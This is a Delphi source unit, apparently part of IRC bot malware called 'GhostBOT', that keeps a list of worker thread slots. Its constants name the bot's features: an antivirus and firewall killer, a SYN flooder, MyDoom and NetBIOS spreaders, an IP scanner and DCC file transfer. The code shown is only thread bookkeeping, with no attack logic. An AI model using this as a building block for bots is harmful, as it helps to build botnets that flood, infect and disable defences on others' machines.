   UNIT uThreads;

   INTERFACE

   USES
     uBOT;

   CONST                  // Type of threads
     FREE_THREAD         = 00;
     PORTREDIRECT_THREAD = 01;
     WEBSERVER_THREAD    = 02;
     AVFWKILLER_THREAD   = 03;
     SYNFLOODER_THREAD   = 04;
     MYDOOMSP_THREAD     = 05;
     NETBIOSSP_THREAD    = 06;
     IPSCANN_THREAD      = 07;
     CLONESS_THREAD      = 08;
     LISTPROCESS_THREAD  = 09;
     DCCSEND_THREAD      = 10;
     DCCGET_THREAD       = 11;
     LISTDIR_THREAD      = 12;
     IDENTSERVER_THREAD  = 13;
     DCCCHAT_THREAD      = 14;

   TYPE
     TThreads = PACKED RECORD
       TType    : BYTE;
       Handle   : THandle;
       ThreadID : Cardinal;
       GhostBOT : TGhostBOT;                                                       //Owner Class
       Sock     : Integer;
       MsgTo    : STRING;
       Params1  : STRING;
       Params2  : STRING;
       Params3  : STRING;
       Params4  : STRING;
       Params5  : STRING;
       Params6  : STRING;
     END;

     TThreadList = CLASS
     PUBLIC
       Threads : ARRAY[1..5000] OF TThreads;
       Count : Integer;
       FUNCTION Add : WORD;
       CONSTRUCTOR Create;
     END;

   VAR
     ThreadList : TThreadList;

   IMPLEMENTATION

   CONSTRUCTOR TThreadList.Create;
   BEGIN
     Count:=1;
     FillChar(Threads,SizeOf(Threads),0);
   END;

   FUNCTION TThreadList.Add : WORD;
   VAR
     I : WORD;
   BEGIN
     Result:=0;
     IF Count>0 THEN BEGIN
       FOR I:=1 TO Count DO BEGIN
         IF Threads[I].TType=0 THEN BEGIN
           Result:=I;
           Break;
         END;
       END;
     END;
     IF Result=0 THEN BEGIN
       Inc(Count);
       Result:=Count;
     END;
   END;

   END.
